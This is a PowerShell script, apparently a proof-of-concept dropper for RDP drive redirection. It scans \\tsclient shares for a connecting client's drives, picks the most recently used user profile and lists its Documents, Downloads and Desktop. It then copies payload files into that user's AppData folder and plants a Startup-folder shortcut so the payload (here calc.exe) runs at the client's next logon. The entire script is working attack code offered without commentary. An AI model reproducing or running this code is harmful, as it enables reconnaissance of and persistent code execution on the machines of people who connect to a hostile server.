$ErrorActionPreference = 'Stop'

$baseOutputDir = "C:\Temp"
$copyFromDir = "C:\Temp\copyfrom"
$lnkName = "Demo.lnk"
$lnkTargetName = "calc.exe"

$stamp = Get-Date -Format 'yyyy-MM-dd-HH-mm-ss'
$execDir = Join-Path $baseOutputDir $stamp

$null = New-Item -ItemType Directory -Path $execDir -Force

$SKIP_PROFILES = @('Public', 'Default', 'Default User', 'All Users', 'DefaultAppPool', 'WDAGUtilityAccount', 'systemprofile', 'LocalService', 'NetworkService')

$redirected = foreach ($letter in [char[]](65..90)) {
    $share = "\\tsclient\$letter"
    if (Test-Path -LiteralPath $share -ErrorAction SilentlyContinue) {
        [pscustomobject]@{
            Letter   = $letter
            Share    = $share
            HasUsers = (Test-Path -LiteralPath (Join-Path $share 'Users') -ErrorAction SilentlyContinue)
            HasWindows = (Test-Path -LiteralPath (Join-Path $share 'Windows') -ErrorAction SilentlyContinue)
            HasProgramFiles = (Test-Path -LiteralPath (Join-Path $share 'Program Files') -ErrorAction SilentlyContinue)
        }
    }
}
$redirected = @($redirected)

if ($redirected.Count -eq 0) {
    return
}

$identified = $null
$profiles = @()

$redirected | Format-Table Letter, Share, HasUsers, HasWindows, HasProgramFiles -AutoSize | Out-File -FilePath (Join-Path $execDir 'redirectedDrives.txt') -Encoding UTF8

if (-not ($redirected | Where-Object HasUsers)) {
    return
}
else {
    foreach ($drive in ($redirected | Where-Object HasUsers)) {
        $usersPath = Join-Path $drive.Share 'Users'
        $candidates = @(Get-ChildItem -LiteralPath $usersPath -Directory -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin $SKIP_PROFILES })

        foreach ($c in $candidates) {
            $readable = $false
            try {
                $null = Get-ChildItem -LiteralPath $c.FullName -Force -ErrorAction Stop
                $readable = $true
            }
            catch { $readable = $false }

            $profiles += [pscustomobject]@{ 
                Name = $c.Name
                Readable = $readable
                LastWrite = $c.LastWriteTime
                Path = $c.FullName 
            }
        }
    }

    $profiles | Format-Table Name, Readable, LastWrite, Path -AutoSize | Out-File -FilePath (Join-Path $execDir 'profiles.txt') -Encoding UTF8

    $readableProfiles = @($profiles | Where-Object Readable)
    if ($readableProfiles.Count -eq 1) {
        $identified = $readableProfiles[0]
    }
    elseif ($readableProfiles.Count -gt 1) {
        $identified = ($readableProfiles | Sort-Object LastWrite -Descending | Select-Object -First 1)
    }

    if ($identified) {
        Get-ChildItem -Force (Join-Path $identified.Path "Documents") | Out-File -FilePath (Join-Path $execDir 'documents.txt')
        Get-ChildItem -Force (Join-Path $identified.Path "Downloads") | Out-File -FilePath (Join-Path $execDir 'downloads.txt')
        Get-ChildItem -Force (Join-Path $identified.Path "Desktop") | Out-File -FilePath (Join-Path $execDir 'desktop.txt')
        
        $dest = (Join-Path $identified.Path "\AppData\Local\Microsoft\Windows\Demo")

        New-Item -ItemType Directory -Path (Join-Path $identified.Path "\AppData\Local\Microsoft\Windows\Demo") -Force 
        Copy-Item -Path (Join-Path $copyFromDir '*') -Destination $dest -Recurse -Force


        $convertedPath = $dest -replace '^\\\\tsclient\\([A-Za-z])\\', '$1:\'
        $targetPath = (Join-Path $convertedPath $lnkTargetName)

        $shortcutPath = (Join-Path $identified.Path "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

        $shell    = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut((Join-Path $shortcutPath $lnkName))
        $shortcut.TargetPath = $targetPath
        $shortcut.WorkingDirectory = $convertedPath
        $shortcut.IconLocation     = "$targetPath,0"
        $shortcut.Save()

        Get-ChildItem -Force $dest | Out-File -FilePath (Join-Path $execDir 'droppercheck.txt')
        Get-ChildItem -Force $shortcutPath | Out-File -FilePath (Join-Path $execDir 'startupcheck.txt')
        
    }
    else {
        return 
    }
}